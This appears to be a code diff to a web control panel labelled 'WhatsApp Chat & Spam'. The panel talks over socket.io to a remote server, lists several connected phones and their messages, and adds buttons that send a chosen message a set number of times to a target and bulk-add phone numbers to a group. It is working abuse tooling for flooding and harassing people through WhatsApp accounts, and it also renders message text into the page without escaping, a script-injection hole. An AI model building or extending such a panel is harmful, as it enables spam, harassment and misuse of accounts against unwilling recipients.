@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Chat Viewer</title>
+    <title>WhatsApp Chat + Spam</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:sans-serif;background:#0a0a0a;color:#fff;display:flex;height:100vh}
@@ -20,22 +20,43 @@
         .sender{color:#25D366;font-weight:bold;font-size:14px}
         .text{word-wrap:break-word;margin:5px 0}
         .time{font-size:10px;color:#888}
+        .controls{padding:15px;background:#111;border-top:1px solid #222}
+        .controls input, .controls button{padding:10px;margin:5px;border-radius:8px;border:1px solid #333;background:#1a1a1a;color:#fff}
+        .controls button{background:#25D366;color:#000;font-weight:bold;cursor:pointer;border:none}
+        .controls button:hover{background:#1ebe57}
+        .row{display:flex;gap:5px;flex-wrap:wrap}
+        .row input{flex:1;min-width:100px}
     </style>
 </head>
 <body>
     <div class="sidebar">
-        <h3>📱 Online Users</h3>
-        <div id="users"><p style="color:#888">Waiting...</p></div>
+        <h3>📱 Users</h3>
+        <div id="users"><p style="color:#888">Loading...</p></div>
     </div>
     <div class="main">
-        <div class="header"><h2>💬 WhatsApp Chat</h2><p style="color:#888;font-size:14px" id="active">Select user</p></div>
+        <div class="header">
+            <h2>💬 WhatsApp Chat & Spam</h2>
+            <p style="color:#888;font-size:14px" id="active">Select a user</p>
+        </div>
         <div class="msgs" id="msgs"><p style="color:#888;text-align:center;margin-top:100px">👈 Select a phone</p></div>
+        <div class="controls">
+            <div class="row">
+                <input type="text" id="target" placeholder="📱 Target (@user or 2012...)" style="flex:2">
+                <input type="text" id="msgText" placeholder="💬 Message">
+                <input type="number" id="msgCount" placeholder="🔢 Count" value="10" style="max-width:80px">
+            </div>
+            <div class="row">
+                <button onclick="sendSpam()">🚀 Send Spam</button>
+                <button onclick="addMembers()">👥 Add Members</button>
+            </div>
+            <div id="spamStatus" style="margin-top:10px;color:#25D366;font-size:14px"></div>
+        </div>
     </div>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <script>
         const socket = io('https://ai-proxy-production-59b3.up.railway.app');
         let active = null;
-        
+
         socket.on('message', (d) => {
             if (active && d.phone === active) addMsg(d);
             updateUsers();
@@ -44,14 +65,14 @@
         function addMsg(d) {
             const div = document.createElement('div');
             div.className = 'msg ' + (d.type === 'out' ? 'out' : 'in');
-            div.innerHTML = `<div class="sender">👤 ${d.from}</div><div class="text">${d.text}</div><div class="time">🕒 ${new Date(d.time).toLocaleTimeString('ar-EG')}</div>`;
+            div.innerHTML = `<div class="sender">${d.type==='out'?'📤':'📥'} ${d.from}</div><div class="text">${d.text}</div><div class="time">🕒 ${new Date(d.time).toLocaleTimeString('ar-EG')}</div>`;
             document.getElementById('msgs').appendChild(div);
             document.getElementById('msgs').scrollTop = document.getElementById('msgs').scrollHeight;
         }
 
         function selectUser(p) {
             active = p;
-            document.getElementById('active').textContent = '📱 ' + p;
+            document.getElementById('active').textContent = '📱 Active: ' + p;
             document.getElementById('msgs').innerHTML = '';
             fetch('https://ai-proxy-production-59b3.up.railway.app/api/messages')
                 .then(r => r.json())
@@ -66,6 +87,44 @@
                         `<div class="user ${p===active?'active':''}" onclick="selectUser('${p}')">📱 ${p}</div>`
                     ).join('') || '<p style="color:#888">No users</p>';
                 });
+        }
+
+        function sendSpam() {
+            if (!active) return alert('Select a user first!');
+            const target = document.getElementById('target').value.trim();
+            const message = document.getElementById('msgText').value.trim();
+            const count = parseInt(document.getElementById('msgCount').value);
+            
+            if (!target || !message || !count) return alert('Fill all fields!');
+            
+            document.getElementById('spamStatus').textContent = '⏳ Sending ' + count + ' messages...';
+            
+            socket.emit('send-spam', {
+                phone: active,
+                target: target,
+                message: message,
+                count: count
+            });
+            
+            setTimeout(() => {
+                document.getElementById('spamStatus').textContent = '✅ Spam command sent!';
+            }, 1000);
+        }
+
+        function addMembers() {
+            if (!active) return alert('Select a user first!');
+            const groupId = document.getElementById('target').value.trim();
+            const numbers = prompt('Enter numbers (comma separated):');
+            
+            if (!groupId || !numbers) return alert('Fill all fields!');
+            
+            socket.emit('add-members', {
+                phone: active,
+                groupId: groupId,
+                numbers: numbers.split(',').map(n => n.trim())
+            });
+            
+            document.getElementById('spamStatus').textContent = '✅ Add members command sent!';
         }
 
         setInterval(updateUsers, 3000);
